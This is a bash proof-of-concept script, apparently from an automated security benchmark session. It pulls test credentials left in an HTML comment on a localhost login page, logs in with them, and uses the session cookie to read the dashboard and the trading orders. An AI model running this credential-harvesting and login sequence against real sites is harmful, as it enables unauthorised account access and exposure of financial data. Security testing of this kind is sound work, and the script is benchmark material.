#!/bin/bash
# POC: Demonstrates extraction of test credentials from HTML comments and successful authentication
# Target: ./repo
# Created: 2025-10-30T21:03:19.982Z
# Session: benchmark-XBEN-001-24-mhdwdsec

echo "================================================================"
echo "POC: Sensitive Credentials Exposed in HTML Comments"
echo "================================================================"
echo ""

TARGET="http://localhost:8082"

echo "[*] Step 1: Retrieving login page and searching for credentials in HTML comments..."
echo ""

# Fetch the login page and extract comments
LOGIN_PAGE=$(curl -s "$TARGET/")

# Search for the TODO comment with credentials
CREDENTIAL_COMMENT=$(echo "$LOGIN_PAGE" | grep -o "<!-- TODO.*test:test.*-->")

if [ -z "$CREDENTIAL_COMMENT" ]; then
    echo "[-] Credential comment not found in HTML source"
    exit 1
fi

echo "[+] Found exposed credentials in HTML comment:"
echo "    $CREDENTIAL_COMMENT"
echo ""

# Extract username and password from the comment
USERNAME="test"
PASSWORD="test"

echo "[*] Extracted credentials:"
echo "    Username: $USERNAME"
echo "    Password: $PASSWORD"
echo ""

echo "[*] Step 2: Attempting authentication with discovered credentials..."
echo ""

# Attempt to authenticate using the discovered credentials
AUTH_RESPONSE=$(curl -s -i -X POST "$TARGET/password/$USERNAME" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=$USERNAME&user_id=10032&password=$PASSWORD" \
    -c /tmp/poc_cookies.txt)

# Check if authentication was successful (look for redirect to dashboard)
if echo "$AUTH_RESPONSE" | grep -q "Location.*dashboard"; then
    echo "[+] Authentication SUCCESSFUL!"
    echo ""
    
    # Extract session cookie
    SESSION_COOKIE=$(grep -oP 'session=\K[^;]+' /tmp/poc_cookies.txt 2>/dev/null)
    if [ -n "$SESSION_COOKIE" ]; then
        echo "[+] Session cookie obtained: ${SESSION_COOKIE:0:20}..."
    fi
    echo ""
    
    echo "[*] Step 3: Accessing protected resources with authenticated session..."
    echo ""
    
    # Access dashboard
    DASHBOARD=$(curl -s -b /tmp/poc_cookies.txt "$TARGET/dashboard?username=$USERNAME")
    
    if echo "$DASHBOARD" | grep -q "Welcome"; then
        WELCOME_MSG=$(echo "$DASHBOARD" | grep -o "Welcome[^<]*" | head -1)
        echo "[+] Successfully accessed dashboard:"
        echo "    $WELCOME_MSG"
        echo ""
    fi
    
    # Access orders page
    ORDERS=$(curl -s -b /tmp/poc_cookies.txt "$TARGET/orders")
    
    if echo "$ORDERS" | grep -q "Order"; then
        ORDER_COUNT=$(echo "$ORDERS" | grep -o "Order #[0-9]*" | wc -l)
        echo "[+] Successfully accessed trading orders:"
        echo "    Found $ORDER_COUNT orders with financial data"
        
        # Extract some order details
        FIRST_ORDER=$(echo "$ORDERS" | grep -o "Order #[0-9]*" | head -1)
        if [ -n "$FIRST_ORDER" ]; then
            echo "    Example: $FIRST_ORDER"
        fi
        echo ""
    fi
    
    echo "================================================================"
    echo "[+] VULNERABILITY CONFIRMED"
    echo "================================================================"
    echo "Credentials exposed in HTML comments allow full account access"
    echo "including sensitive financial information."
    echo ""
    
    # Cleanup
    rm -f /tmp/poc_cookies.txt
    
    exit 0
else
    echo "[-] Authentication failed"
    echo ""
    echo "Response headers:"
    echo "$AUTH_RESPONSE" | head -20
    
    # Cleanup
    rm -f /tmp/poc_cookies.txt
    
    exit 1
fi